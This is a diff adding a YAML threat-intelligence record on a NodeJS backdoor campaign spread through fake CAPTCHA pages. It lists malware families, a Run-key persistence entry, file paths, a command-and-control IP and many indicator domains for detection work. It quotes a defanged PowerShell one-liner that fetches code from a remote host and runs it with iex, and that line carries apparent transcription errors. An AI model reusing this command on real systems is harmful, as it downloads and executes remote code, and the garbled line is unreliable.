@@ -1,0 +1,102 @@
+description: A NodeJS-based backdoor campaign leveraging deceptive CAPTCHA verification
+  and malicious JavaScript injection, with persistence via registry Run key and execution
+  of node.exe scripts.
+attribution: Unknown threat actor; reported by Trustwave SpiderLabs
+malware_families:
+- YaNB
+- KongTuke
+- Fake CAPTCHA
+- NodeJS RAT
+TTPs:
+  processes: []
+  commandline:
+  - '''node.exe'' ''-e'' ''malicious script'''
+  - '''powershell.exe'' ''-noprofile'' ''-w'' ''H'' ''-c'' ''$r=iwrhxxps://conpag-hr-buyers-where.trycloudflare[.]com/cloudfla-h6(*X-Computer-Name=$env:COMPUTERNANE
+    };$s=[Text.Encoding]::Utf8.GetString($r.Content);iex $sTM;'''
+  powershell:
+  - $r=iwrhxxps://conpag-hr-buyers-where.trycloudflare[.]com/cloudfla-h6(*X-Computer-Name=$env:COMPUTERNANE
+    };$s=[Text.Encoding]::Utf8.GetString($r.Content);iex $sTM;
+  scripting_engine: []
+  registry_keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ChromeUpdater
+  image_load: []
+  network_connections:
+  - process: node.exe
+    destination: 159.69.3.151
+    port: 80
+  file_activity:
+  - '%APPDATA%\node-v22.11.0-win-x64.zip'
+  - '%APPDATA%\script_path.log'
+  - '%APPDATA%\[a-z0-9]{8}[a-z0-9]{8}.exe'
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 159.69.3.151
+  domains:
+  - inteklabs.com
+  - ronsamuel.com
+  - compralibri.com
+  - wccdefense.com
+  - pdmfg.com
+  - kkmic.com
+  - loycos.com
+  - computertecs.com
+  - vfclan.com
+  - janhugo.com
+  - tecnogrup.com
+  - kimjohan.com
+  - opteme.com
+  - vononline.com
+  - paulsss.com
+  - samaxwell.com
+  - cyberetc.com
+  - srpkoa.com
+  - mallternet.com
+  - willchar.com
+  - harmarpets.com
+  - rimstarintl.com
+  - wqenpene.com
+  - netsolut.com
+  - unclezekes.com
+  - debolts.com
+  - sunotels.com
+  - fnbsuffield.com
+  - remaxnoc.com
+  - onlinelas.com
+  - szshenyao.com
+  - vessweb.com
+  - scanpaq.com
+  - pirahnas.com
+  - iconcss.com
+  - agretex.com
+  - telback.com
+  - divexpo.com
+  - lifewis.com
+  - aecint.com
+  - idioinc.com
+  - ppdpharmaco.com
+  - akmcons.com
+  - sesraw.com
+  - opticna.com
+  - sinobz.com
+  - rystrom.com
+  - vglweb.com
+  - zxcaem.com
+  - saytunka.com
+  - prpages.com
+  - glccf.com
+  - exodvs.com
+  - pursyst.com
+  - ecrut.com
+  - usbkits.com
+  - ambiwa.com
+  - boneyn.com
+  - satpr.com
+  urls: []
+authors:
+- Reegun Jayapaul
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/yet-another-nodejs-backdoor-yanb-a-modern-challenge/
+date_of_publication: April 29, 2025
+file_creation_date: September 02, 2025
